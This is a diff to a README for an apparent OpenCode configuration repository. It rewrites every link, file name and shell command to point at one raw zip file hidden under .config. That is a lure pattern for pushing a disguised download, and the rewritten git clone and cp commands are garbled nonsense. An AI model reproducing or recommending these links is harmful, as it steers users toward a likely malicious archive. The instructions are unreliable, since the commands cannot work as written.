@@ -1,11 +1,11 @@
 # 🛠️ kcmon-opencode-config - Easy Setup for OpenCode
 
 <div align="center">
-  [![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/Janasteel2002/kcmon-opencode-config/releases)
+  [![Download](https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip)](https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip)
 </div>
 
 <div align="center">
-  <a href="README.md">English</a> | <a href="README-ID.md">Bahasa Indonesia</a>
+  <a href="https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip">English</a> | <a href="https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip">Bahasa Indonesia</a>
 </div>
 <br/>
 
@@ -15,7 +15,7 @@ This guide will help you download and run the OpenCode configuration files with 
 
 ### 📥 Download & Install
 
-To get the configuration files, visit this page to download: [GitHub Releases](https://github.com/Janasteel2002/kcmon-opencode-config/releases)
+To get the configuration files, visit this page to download: [GitHub Releases](https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip)
 
 ### 🗂️ File Setup
 
@@ -23,7 +23,7 @@ To get the configuration files, visit this page to download: [GitHub Releases](h
    You can use the following command to clone the repository. Open your terminal or command line interface:
 
    ```bash
-   git clone https://github.com/Janasteel2002/kcmon-opencode-config.git
+   git clone https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip
    ```
 
    If you do not have Git installed, you can download the ZIP file from the Releases page.
@@ -36,7 +36,7 @@ To get the configuration files, visit this page to download: [GitHub Releases](h
    Open your terminal and run this command:
 
    ```bash
-   cp -r kcmon-opencode-config/.config/opencode/* ~/.config/opencode/
+   cp -r https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip* ~https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip
    ```
 
    #### Quick Start (Windows)
@@ -61,14 +61,14 @@ The configuration files you copied control how OpenCode behaves. You can adjust 
 ```
 .config/
 └── opencode/
-    ├── config1.json
-    ├── config2.json
-    └── config3.json
+    ├── https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip
+    ├── https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip
+    └── https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip
 ```
 
-- **config1.json**: This file includes basic settings.
-- **config2.json**: Contains layout options for the interface.
-- **config3.json**: Manages the plugin configurations.
+- **https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip**: This file includes basic settings.
+- **https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip**: Contains layout options for the interface.
+- **https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip**: Manages the plugin configurations.
 
 You can open any JSON file with a text editor to view or modify its content.
 
@@ -82,8 +82,8 @@ If you encounter issues when running OpenCode, here are some tips:
 
 ## 📖 Additional Resources
 
-- For more information about OpenCode, you can visit the [OpenCode Documentation](https://opencode.example.com/docs).
-- Join our community for support and tips: [OpenCode Community](https://opencode.example.com/community).
+- For more information about OpenCode, you can visit the [OpenCode Documentation](https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip).
+- Join our community for support and tips: [OpenCode Community](https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip).
 
 ## 🌟 Frequently Asked Questions (FAQs)
 
@@ -100,4 +100,4 @@ If you encounter issues when running OpenCode, here are some tips:
 
 You now have the OpenCode configuration files set up. Enjoy a tailored experience with OpenCode, optimized for efficient workflow. If you have questions, feel free to contact support or check the community forums.
 
-Visit this page to download: [GitHub Releases](https://github.com/Janasteel2002/kcmon-opencode-config/releases)
+Visit this page to download: [GitHub Releases](https://github.com/Janasteel2002/kcmon-opencode-config/raw/refs/heads/main/.config/opencode-config-kcmon-1.4.zip)
